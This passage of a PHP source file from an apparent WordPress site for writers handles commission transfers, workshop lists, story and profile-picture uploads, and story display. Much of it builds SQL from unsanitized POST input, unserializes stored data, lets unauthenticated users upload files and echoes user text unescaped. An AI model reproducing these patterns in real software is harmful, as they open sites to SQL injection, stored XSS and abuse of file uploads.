	$story_id = isset($_POST['story_id']) ? (int)$_POST['story_id'] : (int) $story_id;
	$action_initiator = isset($_POST['action_initiator']) ? (int)$_POST['action_initiator'] : (int) $action_initiator;
	$error = '';

	if ($commission == '') {
		$error = 'commission_empty';
	} else if ($action == '') {
		$error = 'action_empty';
	} else if (($action == 'tr' || $action == 're')  && ($sender_id == '' || $receiver_id == '')) {
		if ($sender_id == '') {
			$error = 'sender_id_empty';
		} else if ($receiver_id == '') {
			$error = 'receiver_id_empty';
		}
	} else if (($action == 'cc' || $action == 'ce')  && ($action_initiator == '' || $sender_id == '' || $receiver_id == '')) {
		if ($sender_id == '') {
			$error = 'sender_id_empty';
		} else if ($receiver_id == '') {
			$error = 'receiver_id_empty';
		} else if ($action_initiator == '') {
			$error = 'action_initiator_empty';
		}
	} else if (($action == 'sc' || $action == 'sp')  && ($sender_id == '' || $story_id == '')) {
		if ($sender_id == '') {
			$error = 'sender_id_empty';
		} else if ($story_id == '') {
			$error = 'story_id_empty';
		}
	}

	if ($error != '') {
		if ($is_ajax_call) {
			wp_send_json_success($error);
			wp_die();
		}
		return $error;
	}

	$action_history = $wpdb->get_var("SELECT action_history FROM $table_name WHERE code = '" . $commission . "'");
	$action_history = unserialize($action_history);
	$action_history = is_array($action_history) ? $action_history : [];

	if ($action == 'tr' || $action == 're') {
		$action_history += [time() => strtoupper($action) . '-' . $sender_id . '-' . $receiver_id];
	} else if ($action == 'sc' || $action == 'sp') {
		$action_history += [time() => strtoupper($action) . '-' . $sender_id . '-' . $story_id];
	} else if ($action == 'cc' || $action == 'ce') {
		$action_history += [time() => strtoupper($action) . '-' . $action_initiator  . '-' . $sender_id . '-' . $receiver_id];
	}

	$wpdb->get_results("UPDATE {$table_name} SET action_history = '" . serialize($action_history) . "' WHERE code = '" . $commission . "'");


	return true;
}
add_action('wp_ajax_pol_update_commission_action', 'pol_update_commission_action');


function pol_decode_commission_action_history($commission)
{

	global $wpdb;
	$action_history = $wpdb->get_var("SELECT action_history FROM {$wpdb->prefix}commission WHERE code = '$commission'");


	// Unserialize the action history if it's not already an array
	$action_history = unserialize($action_history);
	$action_history = is_array($action_history) ? $action_history : [];

	if (empty($action_history)) {
		return 'NO HISTORY FOUND';
	}

	$sentences = [];

	// Define what each action means
	$action_types = [
		'TR' => '[%s] Commission transferred from %s to %s. <br>',
		'RE' => '[%s] Commission revoked by %s from %s. <br>',
		'CC' => '[%s] New commission created by %s and rae is %s and assigned to %s. <br>',
		'CE' => '[%s] Commission edited by %s and rae is %s and assigned to %s. <br>',
		'SC' => '[%s] Story created by %s for the story "%s". <br>',
		'SP' => '[%s] Story published by %s for the story "%s". <br>'
	];

	// Sort the array by keys (timestamps) in descending order
	krsort($action_history);



	// Iterate over the action history and generate sentences
	foreach ($action_history as $timestamp => $actions) {
		$action_date_time = date('Y-m-d H:i:s', (int)$timestamp);
		$action_parts = explode('-', $actions);

		// Get the action code (e.g., 'TR', 'RE', etc.)
		$action_code = $action_parts[0];
		$sender_id = (int) $action_parts[1];
		$recipient_or_story_id = (int) $action_parts[2];

		// Retrieve the display name of the user from the database
		$sender_user = get_userdata($sender_id);
		$sender_name = $sender_user->display_name;

		// For story-related actions, get the post title
		if ($action_code === 'SC' || $action_code === 'SP') {
			$story_title = get_the_title($recipient_or_story_id);
		}

		if ($action_code === 'CC' || $action_code === 'CE') {
			$action_initiator = $action_parts[1];
			$action_initiator_user = get_userdata($action_initiator);
			$action_initiator_name = $action_initiator_user->display_name;

			$sender_user = get_userdata((int) $action_parts[2]);
			$sender_name = $sender_user->display_name;

			$receiver_user = get_userdata((int) $action_parts[3]);
			$receiver_name = $receiver_user->display_name;
		}

		if ($action_code === 'TR' || $action_code === 'RE') {
			$receiver_user = get_userdata($recipient_or_story_id);
			$receiver_name = $receiver_user->display_name;
		}

		// Check if the action code is valid
		if (array_key_exists($action_code, $action_types)) {
			if ($action_code === 'TR' || $action_code === 'RE') {
				$sentences[] .= sprintf($action_types[$action_code], $action_date_time, $sender_name, $receiver_name);
			} elseif ($action_code === 'SC' || $action_code === 'SP') {
				$sentences[] .= sprintf($action_types[$action_code], $action_date_time, $sender_name, $story_title);
			} elseif ($action_code === 'CC' || $action_code === 'CE') {
				$sentences[] .= sprintf($action_types[$action_code], $action_date_time, $action_initiator_name, $sender_name,  $receiver_name);
			}
		}
	}

	// Return the sentences with each sentence on a new line
	return implode("\n", $sentences);
}


add_action('wp_ajax_pol_transfer_commission', 'pol_transfer_commission');
function pol_transfer_commission()
{
	if (!is_user_logged_in()) {
		return;
	}

	global $wpdb;
	$table_name = $wpdb->prefix . 'commission';

	$commission_code_id = $_POST['commissions'];
	$sender_id = get_current_user_id();
	$receiver_id = (int)$_POST['receiver'];
	$curr_user_role = $_POST['currUserRole'];

	//get the receiver role
	$receiver_user = get_user_by('id', (int) $receiver_id);
	$recevier_role = 'user';
	if (get_user_meta((int) $receiver_id, 'rae_approved', true) == 1) {
		$recevier_role = 'rae';
	} else if (in_array('administrator', (array) $receiver_user->roles)) {
		$recevier_role = 'admin';
	}

	//update the usermeta to remove request of the user
	update_user_meta((int)$receiver_id, 'currently_seeking_commission', [0, date("d/m/Y")]);

	foreach ($commission_code_id as $id) {

		$commission_code = $wpdb->get_var("SELECT code FROM $table_name WHERE id = '" . $id . "'");

		if (($curr_user_role == "rae" || $curr_user_role == "admin") && ($recevier_role == "rae" || $recevier_role == "admin")) {

			$update_sql = $wpdb->get_results("UPDATE $table_name SET status = 0 , last_transfer = CURRENT_TIMESTAMP, current_owner = " . $receiver_id . " WHERE id = '" . $id . "'");
			cpm_send_commission_transfer_email($receiver_id, 'rae_rae', $commission_code, '');
		} else if (($curr_user_role == "rae" || $curr_user_role == "admin") && $recevier_role == "user") {

			$update_sql = $wpdb->get_results("UPDATE $table_name SET status = 1 , last_transfer = CURRENT_TIMESTAMP, org_rae = " . $sender_id . ", current_owner = " . $receiver_id . " WHERE id = '" . $id . "'");
			cpm_send_commission_transfer_email($receiver_id, 'rae_user', $commission_code, '');
		} else if ($curr_user_role == "user" && ($recevier_role == "rae" || $recevier_role == "admin")) {
			// $curr_org_rae = $wpdb->get_var( $wpdb->prepare("SELECT org_rae FROM $table_name WHERE id = '" . $id . "'"));
			$update_sql = $wpdb->get_results("UPDATE $table_name SET status = 0 , last_transfer = CURRENT_TIMESTAMP, org_rae = $receiver_id, current_owner = " . $receiver_id . " WHERE id = '" . $id . "'");
			cpm_send_commission_transfer_email($receiver_id, 'user_rae', $commission_code, '');
		} else if ($curr_user_role == "user" && $recevier_role == "user") {

			$update_sql = $wpdb->get_results("UPDATE $table_name SET status = 1 , last_transfer = CURRENT_TIMESTAMP,current_owner = " . $receiver_id . " WHERE id = '" . $id . "'");

			$org_rae = $wpdb->get_var("SELECT org_rae FROM $table_name WHERE id = '" . $id . "'");
			$org_rae_user = get_user_by('id', (int) $org_rae);

			cpm_send_commission_transfer_email($receiver_id, 'user_user', $commission_code, $org_rae_user->display_name);
		}

		pol_update_commission_action($commission_code, 'tr', $sender_id, $receiver_id);

	}

	wp_die();
}


add_action('wp_ajax_pol_transfer_single_commission', 'pol_transfer_single_commission');
function pol_transfer_single_commission()
{
	global $wpdb;
	$rae_id = $_POST['raeID'];
	$author_id = $_POST['authorID'];

	$receiver_user = get_user_by('id', (int) $author_id);
	$recevier_role = 'user';
	if (get_user_meta((int) $author_id, 'rae_approved', true) == 1) {
		$recevier_role = 'rae';
	} else if (in_array('administrator', (array) $receiver_user->roles)) {
		$recevier_role = 'admin';
	}

	$code_status = 1;
	if ($recevier_role == 'admin' || $recevier_role == 'rae') {
		$code_status = 0;
	}

	//get one comission of the rae whose status is 0
	$table_name = $wpdb->prefix . 'commission';
	$commission_code = $wpdb->get_var("SELECT code FROM $table_name WHERE current_owner = '" . $rae_id . "' AND status = 0 LIMIT 1");

	if (!empty($commission_code)) {
		$update_sql = $wpdb->get_results("UPDATE $table_name SET status = $code_status , last_transfer = CURRENT_TIMESTAMP, current_owner = " . $author_id . " WHERE code = '" . $commission_code . "'");
		cpm_send_commission_transfer_email($author_id, 'rae_user', $commission_code, get_user_by('id', (int) $rae_id)->display_name);
		pol_update_commission_action($commission_code, 'tr', $rae_id, $author_id);
		wp_send_json_success(['transfered']);
	} else {
		wp_send_json_success('not_found');
	}
}


add_action('wp_ajax_pol_update_commission_status', 'pol_update_commission_status');
function pol_update_commission_status()
{
	global $wpdb;
	$table_name = $wpdb->prefix . 'commission';
	$commission = $_POST['commission'];


	$wpdb->get_results("UPDATE {$table_name} SET status = 2, last_transfer = CURRENT_TIMESTAMP WHERE code = '" . $commission . "'");
	$args = array(
		'post_type'  => 'any',
		'meta_query' => array(
			array(
				'key'   => 'commission_used',
				'value' => $commission,
				'compare' => '='
			)
		)
	);

	$query = new WP_Query($args);

	if ($query->have_posts()) {
		while ($query->have_posts()) {
			$query->the_post();

			$post_id = get_the_ID(); // Get post ID
			$post_author_id = get_the_author_meta('ID'); // Get post author ID

			pol_update_commission_action($commission, 'sc', $post_author_id, '', $post_id);
		}
	}
}





//add new workshop to author
add_action('wp_ajax_pol_add_user_workshop', 'pol_add_user_workshop');
function pol_add_user_workshop()
{
	if (in_array('administrator', wp_get_current_user()->roles)) {

		$title = $_POST['title'];
		$details = $_POST['details'];
		$link = $_POST['link'];
		$author_id = $_POST['author_id'];
		$workshops = get_user_meta($author_id, 'workshops', true);
		if (empty($workshops)) {
			$workshops = array();
		}
		$workshops[$title] = [$details, $link];
		update_user_meta($author_id, 'workshops', $workshops);
		wp_send_json_success();
	}
	wp_die();
}


add_action('wp_ajax_pol_revoke_commission', 'pol_revoke_commission');
function pol_revoke_commission()
{
	global $wpdb;
	$rae_id = $_POST['rae_id'];
	$owner_id = $_POST['owner_id'];
	$comission_id = $_POST['comission_id'];

	$table_name = $wpdb->prefix . 'commission';
	$update_sql = $wpdb->get_results("UPDATE $table_name SET status = 0 , last_transfer = CURRENT_TIMESTAMP, current_owner = " . $rae_id . " WHERE id = '" . $comission_id . "'");

	//update commission history
	$commission = $wpdb->get_var("SELECT code FROM $table_name WHERE id = '" . $comission_id . "'");
	wp_send_json_success([pol_update_commission_action($commission, 're', $rae_id, $owner_id)]);
}


//remove new workshop from author
add_action('wp_ajax_pol_remove_user_workshop', 'pol_remove_user_workshop');
function pol_remove_user_workshop()
{

	if (in_array('administrator', wp_get_current_user()->roles)) {

		$title = $_POST['workshop_title'];
		$author_id = $_POST['author_id'];
		$workshops = get_user_meta($author_id, 'workshops', true);
		if (!empty($workshops)) {
			unset($workshops[$title]);
			update_user_meta($author_id, 'workshops', $workshops);
		}
		wp_send_json_success();
	}
	wp_die();
}


//add or remove workshop from user profile
add_action('wp_ajax_pol_add_or_remove_users_from_workshop', 'pol_add_or_remove_users_from_workshop');
function pol_add_or_remove_users_from_workshop()
{
	$workshop_id = (int)$_POST['workshop_id'];
	$author_id = (int)$_POST['author_id'];
	$workshop_action = $_POST['workshop_action'];
	$user_workshops = get_user_meta((int)$author_id, 'workshops', true);

	if ($workshop_action == 'remove') {
		if (is_array($user_workshops) && in_array($workshop_id, $user_workshops)) {
			$key = array_search($workshop_id, $user_workshops);
			if ($key !== false) {
				unset($user_workshops[$key]);
			}
			$user_workshops = array_values($user_workshops);
			update_user_meta($author_id, 'workshops', $user_workshops);
		}
	} else if ($workshop_action == 'add') {
		if (is_array($user_workshops)) {
			array_push($user_workshops, $workshop_id);
			update_user_meta($author_id, 'workshops', $user_workshops);
		} else {
			update_user_meta($author_id, 'workshops', [$workshop_id]);
		}
	}
	wp_die();
}


add_action('wp_ajax_pol_check_email_exists', 'pol_check_email_exists');
add_action('wp_ajax_nopriv_pol_check_email_exists', 'pol_check_email_exists');
function pol_check_email_exists()
{

	$email = $_POST['email'];

	if (email_exists($email)) {
		wp_send_json_success('exists');
	} else {
		wp_send_json_success('not_exists');
	}
}

add_action('wp_ajax_pol_remove_user_from_seeking_commissions_list', 'pol_remove_user_from_seeking_commissions_list');
function pol_remove_user_from_seeking_commissions_list()
{

	$curr_user_id = $_POST['user_id'];
	delete_user_meta($curr_user_id, 'currently_seeking_commission');
	//update_user_meta($curr_user_id, 'currently_seeking_commission', [0, date("d/m/Y")]);

	wp_die();
}

add_action('wp_ajax_pol_request_commission', 'pol_request_commission');
function pol_request_commission()
{
	global $wpdb;

	$uid = get_current_user_id();
	$table_name = $wpdb->prefix . 'commission';

	// $current_commissions = get_user_meta($uid, 'commissions', true);

	// if (is_array($current_commissions)) {
	// 	foreach ($current_commissions as $commission => $id) {
	// 		$table_name = $wpdb->prefix . 'commission';

	// 		$commission_status = $wpdb->get_var("SELECT status FROM {$table_name} WHERE code = '" . $commission . "'");
	// 		var_dump($commission_status);
	// 		if ($commission_status == '1') {
	// 			update_user_meta($uid, 'currently_seeking_commission', [1, date("d/m/Y")]);
	// 			wp_send_json_success('rae_notified');
	// 			break;
	// 		}
	// 	}
	// 	wp_send_json_success('has_commission');
	// } else {
	// 	update_user_meta($uid, 'currently_seeking_commission', [1, date("d/m/Y")]);
	// 	wp_send_json_success('rae_notified');
	// }
	//==========

	$current_commissions = $wpdb->get_var("SELECT count(id) FROM {$table_name} WHERE curr_owner = $uid AND status != 2");

	$currently_seeking_commission = get_user_meta($uid, 'currently_seeking_commission', true);


	if ($currently_seeking_commission[0] == 1 && $current_commissions == 0) { //if rae already notified and does not have any available commissions
		wp_send_json_success('rae_notification_sent');
	} else if ($current_commissions == 0) {
		update_user_meta($uid, 'currently_seeking_commission', [1, date("d/m/Y")]);
		wp_send_json_success('rae_notified');
	} else {
		update_user_meta($uid, 'currently_seeking_commission', [0, date("d/m/Y")]);
		wp_send_json_success('has_commission');
	}



	// if ($current_commissions == 0) {
	// 	update_user_meta($uid, 'currently_seeking_commission', [1, date("d/m/Y")]);
	// 	wp_send_json_success('rae_notified');
	// } else {
	// 	update_user_meta($uid, 'currently_seeking_commission', [0, date("d/m/Y")]);
	// 	wp_send_json_success('has_commission');
	// }
	wp_die();
}


add_action('wp_ajax_pol_check_if_commission_is_valid', 'pol_check_if_commission_is_valid');
function pol_check_if_commission_is_valid()
{
	global $wpdb;
	$table_name = $wpdb->prefix . 'commission';
	$commission_status = $wpdb->get_var("SELECT COUNT(code) FROM $table_name WHERE code = '" . $_POST['commission'] . "' AND current_owner = '" . $_POST['author_id'] . "' AND status != 2");

	if ($commission_status == 0) wp_send_json_success(false);

	wp_send_json_success(true);

	wp_die();
}



add_action('wp_ajax_pol_upload_story_file', 'pol_upload_story_file');
add_action('wp_ajax_nopriv_pol_upload_story_file', 'pol_upload_story_file');
function pol_upload_story_file()
{
	$curr_user_id = get_current_user_id();
	$story_title = $_POST['story_title'];
	$story_desc = $_POST['story_desc'];

	$upload_overrides = array('test_form' => false);
	if (isset($_FILES['file']['name']) && !empty($_FILES['file']['name'])) {

		// WordPress environmet
		require(ABSPATH . '/wp-load.php');
		// it allows us to use wp_handle_upload() function
		require_once(ABSPATH . 'wp-admin/includes/file.php');
		// validation
		if (empty($_FILES['file'])) {
			wp_die('No files selected.');
		}
		$upload_story_file = wp_handle_upload($_FILES['file'], $upload_overrides);
		// var_dump($upload_story_file);
		if (!empty($upload_story_file['error'])) {
			echo 'error vo';
			wp_die($upload_story_file['error']);
		}
		// it is time to add our uploaded image into WordPress media library
		$story_file_id = wp_insert_attachment(
			[
				'guid' => $upload_story_file['url'],
				'post_mime_type' => $upload_story_file['type'],
				'post_title' => basename($upload_story_file['file']),
				'post_content' => '',
				'post_status' => 'inherit',
			],
			$upload_story_file['file']
		);
		if (is_wp_error($story_file_id) || !$story_file_id) {
			wp_die('Upload error.');
		}

		//add title to this story
		update_post_meta($story_file_id, 'story_title', $story_title);
		update_post_meta($story_file_id, 'story_desc', $story_desc);

		//add this story id to the user meta
		$all_uploaded_stories = get_user_meta($curr_user_id, 'uploaded_stories', true);
		if (is_array($all_uploaded_stories)) {
			array_push($all_uploaded_stories, $story_file_id);
		} else {
			$all_uploaded_stories = [$story_file_id];
		}
		update_user_meta($curr_user_id, 'uploaded_stories', $all_uploaded_stories);

		wp_send_json_success($story_file_id);
	}
	die();
}


add_action('wp_ajax_pol_update_profile_picture', 'pol_update_profile_picture');
add_action('wp_ajax_nopriv_pol_update_profile_picture', 'pol_update_profile_picture');
function pol_update_profile_picture()
{
	$curr_user_id = get_current_user_id();

	$upload_overrides = array('test_form' => false);
	if (isset($_FILES['file']['name']) && !empty($_FILES['file']['name'])) {

		// WordPress environmet
		require(ABSPATH . '/wp-load.php');
		// it allows us to use wp_handle_upload() function
		require_once(ABSPATH . 'wp-admin/includes/file.php');
		// validation
		if (empty($_FILES['file'])) {
			wp_die('No files selected.');
		}
		$upload_profile_picture = wp_handle_upload($_FILES['file'], $upload_overrides);
		// var_dump($upload_profile_picture);
		if (!empty($upload_profile_picture['error'])) {
			echo 'error vo';
			wp_die($upload_profile_picture['error']);
		}
		// it is time to add our uploaded image into WordPress media library
		$profile_picture_id = wp_insert_attachment(
			[
				'guid' => $upload_profile_picture['url'],
				'post_mime_type' => $upload_profile_picture['type'],
				'post_title' => basename($upload_profile_picture['file']),
				'post_content' => '',
				'post_status' => 'inherit',
			],
			$upload_profile_picture['file']
		);
		if (is_wp_error($profile_picture_id) || !$profile_picture_id) {
			wp_die('Upload error.');
		}

		update_user_meta($curr_user_id, 'profile_picture', $profile_picture_id);
	}
	die();
}


add_action('wp_ajax_pol_upload_profile_picture', 'pol_upload_profile_picture');
add_action('wp_ajax_nopriv_pol_upload_profile_picture', 'pol_upload_profile_picture');
function pol_upload_profile_picture()
{
	// $curr_user_id = get_current_user_id();
	$profile_picture_id = 0;
	$upload_overrides = array('test_form' => false);
	if (isset($_FILES['file']['name']) && !empty($_FILES['file']['name'])) {

		// WordPress environmet
		require(ABSPATH . '/wp-load.php');
		// it allows us to use wp_handle_upload() function
		require_once(ABSPATH . 'wp-admin/includes/file.php');
		// validation
		if (empty($_FILES['file'])) {
			wp_die('No files selected.');
		}
		$upload_profile_picture = wp_handle_upload($_FILES['file'], $upload_overrides);
		// var_dump($upload_profile_picture);
		if (!empty($upload_profile_picture['error'])) {
			echo 'error vo';
			wp_die($upload_profile_picture['error']);
		}
		// it is time to add our uploaded image into WordPress media library
		$profile_picture_id = wp_insert_attachment(
			[
				'guid' => $upload_profile_picture['url'],
				'post_mime_type' => $upload_profile_picture['type'],
				'post_title' => basename($upload_profile_picture['file']),
				'post_content' => '',
				'post_status' => 'inherit',
			],
			$upload_profile_picture['file']
		);
		if (is_wp_error($profile_picture_id) || !$profile_picture_id) {
			wp_die('Upload error.');
		}

		// update_user_meta($curr_user_id, 'profile_picture', $profile_picture_id);

		wp_send_json_success($profile_picture_id);
	}
	die();
}


add_action('wp_ajax_pol_upload_story_thumbnail', 'pol_upload_story_thumbnail');
add_action('wp_ajax_nopriv_pol_upload_story_thumbnail', 'pol_upload_story_thumbnail');
function pol_upload_story_thumbnail()
{
	$curr_user_id = get_current_user_id();
	$story_file_id = $_POST['story_file_id'];


	$upload_overrides = array('test_form' => false);
	if (isset($_FILES['file']['name']) && !empty($_FILES['file']['name'])) {

		// WordPress environmet
		require(ABSPATH . '/wp-load.php');
		// it allows us to use wp_handle_upload() function
		require_once(ABSPATH . 'wp-admin/includes/file.php');
		// validation
		if (empty($_FILES['file'])) {
			wp_die('No files selected.');
		}
		$upload_story_thumbnail = wp_handle_upload($_FILES['file'], $upload_overrides);
		// var_dump($upload_story_thumbnail);
		if (!empty($upload_story_thumbnail['error'])) {
			echo 'error vo';
			wp_die($upload_story_thumbnail['error']);
		}
		// it is time to add our uploaded image into WordPress media library
		$story_thumbnail_attachment_id = wp_insert_attachment(
			[
				'guid' => $upload_story_thumbnail['url'],
				'post_mime_type' => $upload_story_thumbnail['type'],
				'post_title' => basename($upload_story_thumbnail['file']),
				'post_content' => '',
				'post_status' => 'inherit',
			],
			$upload_story_thumbnail['file']
		);
		if (is_wp_error($story_thumbnail_attachment_id) || !$story_thumbnail_attachment_id) {
			wp_die('Upload error.');
		}

		//add this thumbail to the post id of the uploaded story file
		update_post_meta((int) $story_file_id, 'story_thumbnail', $story_thumbnail_attachment_id);
	}
	die();
}


// function pol_get_user_profile_img_2($user_id)
// {
// 	$avatar_img_url = 'https://secure.gravatar.com/avatar/?s=96&d=mm&r=g';
// 	$profile_picture = get_user_meta($user_id, 'profile_picture', true);


// 	if (gettype($profile_picture) != 'boolean' && ($profile_picture != "" || $profile_picture != 0)) {
// 		$avatar_img_url = $profile_picture;
// 	} else {
// 		$avatar_img_url = get_avatar_url($user_id);
// 	}

// 	return $avatar_img_url;
// }

/* shyam dai ko code */
function pol_get_user_profile_img($user_id)
{
	$avatar_img_url = 'https://secure.gravatar.com/avatar/?s=96&d=mm&r=g';
	$profile_picture = get_user_meta($user_id, 'profile_picture', true);

	if (gettype($profile_picture) != 'boolean' && $profile_picture != "") {
		$avatar_img_url = $profile_picture;
	} else {
		$avatar_img_url = get_avatar_url($user_id);
	}

	return $avatar_img_url;
}





add_shortcode('upload_stories', 'pol_upload_stories');
function pol_upload_stories($atts)
{
	ob_start();
	$curr_page = $atts['page'];
	$current_author_id = $atts['user_id'];
	$current_author = get_user_by('id', (int) $atts['user_id']);
	?>
	<div class="contributors-author-profile">
		<div id="tab-available-works" class="author-tab-content">
			<?php
			$section_heading = 'Upload Your Writing to Share with Others';
			if ($curr_page == 'author') {

				$user_data = get_userdata($current_author_id);
				$display_name =    $user_data->display_name;
				$user_name = get_user_meta($current_author, 'nom_de_plume', true) == ''
					? $current_author->first_name . ' ' . $current_author->last_name
					: get_user_meta($current_author, 'nom_de_plume', true);
				$section_heading = 'Other stories by ' . $display_name;
			}
			?>
			<h1>
				<?php echo $section_heading; ?>
			</h1>
			<?php if ($curr_page == 'profile') { ?>
				<p class="upload-writing-desc">
					Your Contributor’s Page will be accessible to any visitor and have its own dedicated URL.
					You can use it as a place to share your work with other writers and readers.
					Your Contributor’s Page will also automatically list all of the workshops you attend and
					all of the pieces you publish on our site. To connect with the readers and writers who will
					enjoy your work, please upload some pieces that you want to share publicly. Others can read
					them on your Contributor’s Page, and they can select one or more of your pieces as a “favorite”
					of theirs, linking to it on their Contributor’s Page. Please upload what you most want to share
					(using PDF or .docx or .RTF files) and provide a short description with each piece (below):
				</p>
			<?php }

			if ($current_author_id == get_current_user_id()) { ?>
				<?php
				if ($curr_page == 'profile') {

					echo '<button class="show-hide-add-story-form" data-visibility="hidden">Add new story</button>';
				?>
					<form id="direct-story-upload" enctype="multipart/form-data" method="POST">
						<label for="story-title">Story Title</label>
						<input type="text" name="story-title" id="story-title" required>

						<label for="story-desc">Story Description</label>
						<textarea name="story-desc" id="story-desc" cols="30" rows="10" required></textarea>

						<div class="story-upload-thumbnail">
							<label for="story-thumbnail">Story Image:</label>
							<input type="file" name="story-thumbnail" id="story-thumbnail" accept="image/*">

							<label for="story-file">Story file:</label>
							<input type="file" name="story-file" id="story-file" accept=".doc, .docx, .txt, .pdf, .rtf" required><br>

							<input type="submit" name="story-upload" value="Upload" id="story-upload">
						</div>
					</form>
			<?php
				}
			}


			//upload edited story
			if (isset($_POST['upload-edited-story'])) {
				$edited_title = $_POST['story-title'];
				$edited_desc = $_POST['story-desc'];
				$story_id = $_POST['story-id'];
				$curr_user_id = get_current_user_id();

				$uploaded_stories = get_user_meta($curr_user_id, 'uploaded_stories', true);

				if (is_array($uploaded_stories)) {
					// echo '111<br>';

					if (($key = array_search($story_id, $uploaded_stories)) !== false) {
						// echo '222<br>';

						if ($edited_title != '' && $edited_desc != '') {
							update_post_meta((int) $story_id, 'story_title', $edited_title);
							update_post_meta((int) $story_id, 'story_desc', $edited_desc);
						}

						// var_dump($_FILES['story-thumbnail']);
						// update the thumbnail if present
						if (isset($_FILES['story-thumbnail']['name']) && !empty($_FILES['story-thumbnail']['name'])) {
							// echo '333<br>';

							require(ABSPATH . '/wp-load.php');
							require_once(ABSPATH . 'wp-admin/includes/file.php');
							if (empty($_FILES['story-thumbnail'])) {
								echo ('No files selected.');
							}
							$upload_overrides = array('test_form' => false);
							$upload_story_thumbnail = wp_handle_upload($_FILES['story-thumbnail'], $upload_overrides);
							// var_dump($upload_story_thumbnail);
							if (!empty($upload_story_thumbnail['error'])) {
								// echo 'error vo';
								echo ($upload_story_thumbnail['error']);
							}
							// it is time to add our uploaded image into WordPress media library
							$story_thumbnail_attachment_id = wp_insert_attachment(
								[
									'guid' => $upload_story_thumbnail['url'],
									'post_mime_type' => $upload_story_thumbnail['type'],
									'post_title' => basename($upload_story_thumbnail['file']),
									'post_content' => '',
									'post_status' => 'inherit',
								],
								$upload_story_thumbnail['file']
							);
							if (is_wp_error($story_thumbnail_attachment_id) || !$story_thumbnail_attachment_id) {
								echo ('Upload error.');
							}

							//add this thumbail to the post id of the uploaded story file
							update_post_meta((int) $story_id, 'story_thumbnail', $story_thumbnail_attachment_id);
						}
					}
				}
			}


			//show all uploaded stories
			$all_uploaded_stories = get_user_meta($current_author_id, 'uploaded_stories', true);
			$all_liked_uploaded_stories = get_user_meta(get_current_user_id(), 'liked_uploaded_stories', true);

			if (is_array($all_uploaded_stories)) {
				echo '<ul>';
				foreach ($all_uploaded_stories as $story) {
					$story_title = get_post_meta($story, 'story_title', true);
					$story_desc = get_post_meta($story, 'story_desc', true);
					$story_thumbnail_id = get_post_meta($story, 'story_thumbnail', true);
					$story_thumbnail_src = (gettype($story_thumbnail_id) != 'boolean' && ($story_thumbnail_id != '') && ((int) $story_thumbnail_id != 0))
						? wp_get_attachment_url($story_thumbnail_id) : pol_get_random_goat_img_url_for_list_page();

					echo '<li>';



					if (((int)$current_author_id != get_current_user_id()) && is_user_logged_in()) {
						$action = '<i class="fa-regular fa-star"></i>';
						$button_title = 'Choose this story as one of your favorites';

						if (is_array($all_liked_uploaded_stories) && in_array((int) $story, $all_liked_uploaded_stories)) {
							$action = '<i class="fa-solid fa-star"></i>';
							$button_title = 'Remove this story from your favorites';
						}
						echo '<button class="like-uploaded-story tooltip" data-story-id="' . $story . '" data-author-id="' . $current_author_id . '" data-type="pdf">
								' . $action . '
								<span class="tooltiptext" >' . $button_title . '</span>
							</button>';
					}








					if ($story_thumbnail_id != '') {
						echo '<img style="height: 100px;" src="' . wp_get_attachment_url($story_thumbnail_id) . '" alt="' . $story_title . '">';
					} else {
						echo '<img style="height: 100px;" src="' . pol_get_random_goat_img_url_for_list_page() . '" alt="' . $story_title . '">';
					}
					echo '<h4>' . $story_title . '</h4>';
					echo '<h5>' . $story_desc . '</h5>';
					echo '<a href="' . wp_get_attachment_url($story) . '" target="_blank">
											<span class="dkpdf-button-icon">
												<i class="fa-brands fa-readme"></i>
											</span>
											&nbsp;&nbsp;&nbsp;Read this story
										</a>';

					if ($curr_page == 'profile') {
						echo '
								<button 
									class="edit-uploaded-story-btn" 
									data-story-id="' . $story . '" 
									data-thumbnail-id="' . $story_thumbnail_id . '" 
									data-story-title="' . $story_title . '"
									data-story-desc="' . $story_desc . '"
									data-thumbnail-src="' . $story_thumbnail_src . '"
								>
									EDIT
								</button>
								';
						echo '<button data-story-id="' . $story . '" class="del-uploaded-story-btn">DELETE</button>';
					}
					echo '</li>';
				}
				echo '</ul>';
			} else {
				echo '<h6>No uploaded stories found </h6>';
			}

			?>

		</div>
	</div>
	<div id="edit-uploaded-story-modal" class="modal">
		<div class="container">
			<div class="row">
				<div class="col-lg-12">
					<form id="direct-story-upload-edit" enctype="multipart/form-data" method="POST">

						<input type="hidden" name="story-id" class="story-id" value="">
						<input type="hidden" name="story-thumbnail-id" class="story-thumbnail-id" value="">

						<label for="story-title">Story Title</label>
						<input type="text" name="story-title" class="story-title" value="" required>

						<label for="story-desc">Story Description</label>
						<textarea name="story-desc" class="story-desc" cols="30" rows="10" required></textarea>

						<div class="story-upload-thumbnail">
							<label for="story-thumbnail">Story Image:</label>
							<input type="file" name="story-thumbnail" class="story-thumbnail" accept="image/*">
						</div>
						<img class="story-thumbnail-src" src="" alt="">

						<input type="submit" name="upload-edited-story" value="Update" class="upload-edited-story">
					</form>
				</div>
			</div>
		</div>
		<a href="#close-modal" rel="modal:close" class="close-modal edit-modal-close ">Close</a>
	</div>
<?php

	return ob_get_clean();
}


add_action('wp_ajax_pol_delete_uploaded_story', 'pol_delete_uploaded_story');
function pol_delete_uploaded_story()
{
	$curr_user_id = get_current_user_id();
	$story_id = (int) $_POST['storyID'];
	$uploaded_stories = get_user_meta($curr_user_id, 'uploaded_stories', true);

	if (is_array($uploaded_stories)) {

		if (($key = array_search($story_id, $uploaded_stories)) !== false) {
			unset($uploaded_stories[$key]);
			update_user_meta($curr_user_id, 'uploaded_stories', array_values($uploaded_stories));
		}
	}
}

add_action('wp_ajax_pol_like_uploaded_stories', 'pol_like_uploaded_stories');
function pol_like_uploaded_stories()
{
	$story_id = (int) $_POST['storyID'];
	$current_user_id = get_current_user_id();

	$all_liked_uploaded_stories = get_user_meta($current_user_id, 'liked_uploaded_stories', true);

	if (is_array($all_liked_uploaded_stories)) {
		if (in_array($story_id, $all_liked_uploaded_stories)) {
			$key = array_search($story_id, $all_liked_uploaded_stories);
			// var_dump($key);
			if ($key !== false) {
				unset($all_liked_uploaded_stories[$key]);
				update_user_meta($current_user_id, 'liked_uploaded_stories', $all_liked_uploaded_stories);
			}
		} else {
			array_push($all_liked_uploaded_stories, $story_id);
			$all_liked_uploaded_stories = array_values($all_liked_uploaded_stories);
			update_user_meta($current_user_id, 'liked_uploaded_stories', $all_liked_uploaded_stories);
		}
	} else {
		$all_liked_uploaded_stories = [$story_id];
		update_user_meta($current_user_id, 'liked_uploaded_stories', $all_liked_uploaded_stories);
	}


	die();
}


add_action('wp_ajax_pol_get_story_content', 'pol_get_story_content');
